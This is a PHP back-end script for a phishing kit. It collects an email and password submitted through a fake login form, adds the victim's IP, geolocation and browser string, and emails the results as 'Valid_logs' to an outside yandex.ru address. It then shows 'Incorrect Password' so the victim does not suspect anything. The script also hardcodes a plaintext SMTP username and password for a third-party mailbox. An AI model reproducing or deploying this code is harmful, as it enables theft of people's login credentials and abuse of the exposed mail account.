<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE');
header('Access-Control-Allow-Headers: X-Requested-With,Origin,Content-Type,Cookie,Accept');

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

require './src/Exception.php';
require './src/PHPMailer.php';
require './src/SMTP.php';

class Email{
    public function clean($data){
        if(!empty($data)){
            $data = trim(strip_tags(stripslashes($data)));
            return $data;
        }
    }

	public function getIp(){

		$ip = $_SERVER['REMOTE_ADDR'];

		if(!empty($_SERVER['HTTP_CLIENT_IP'])){
			$ip = $_SERVER['HTTP_CLIENT_IP'];
		}elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
			$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		}
		return $ip;
	}

	public function sendMessage($mail, $data){  
		$mail->isSMTP();                                      // Set mailer to use SMTP
		$mail->Host = 'imap.worldposta.com';  // Specify main and backup SMTP servers
		$mail->SMTPAuth = true;                               // Enable SMTP authentication
		$mail->Username = 'safaa.shafei@morshedy.com';                 // SMTP username
		$mail->Password = 'P@ss321';                           // SMTP password
		$mail->SMTPSecure = 'tls';                         // SMTP password
		$mail->Port = 465;
		$mail->From = 'safaa.shafei@morshedy.com';
		$mail->FromName = "Valid_logs";
		$mail->addAddress('only1r00t@yandex.ru');

		$mail->isHTML(true);
		$mail->Subject = $data['subject'];
		$mail->Body    = $data['message'];

		if(!$mail->send()) {
		    return $mail->ErrorInfo;
		} else {
		    return true;
		}
	}

}

if(isset($_POST)){
	$email = new Email;
	$mail = new PHPMailer(true);

	$geo = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$_SERVER['REMOTE_ADDR']));
$country = $geo['geoplugin_regionName'].", ".$geo['geoplugin_countryName'];

    $data = array();
    $data['email'] = $email->clean($_REQUEST['pet']);
    $data['pass'] = $email->clean($_REQUEST['pett']);
    $data['ip'] = $email->getIp();
    $data['browser'] = $country." ".$_SERVER['HTTP_USER_AGENT'];
    $data['subject'] = $email->clean($_REQUEST['pet']);

    $data['message'] =
		"
		<html>
			<head>
				<title>r00t</title>
			</head>

			<body>
				<h3>Details</h3>
				<p>This is the information you required</p>
				<p></p>
			    <p><strong>E-ID:</strong> ".$data['email']."</p>
			    <p><strong>P-ID:</strong>".$data['pass']."</p>
				<p></p>
			    <p><strong>IP:</strong>".$data['ip']."</p>
			    <br>
			</body>
		</html>
		";

	if($email->sendMessage($mail, $data)){
		echo "Incorrect Password";
	}else{
		echo "Something went wrong";
	}

}
?>
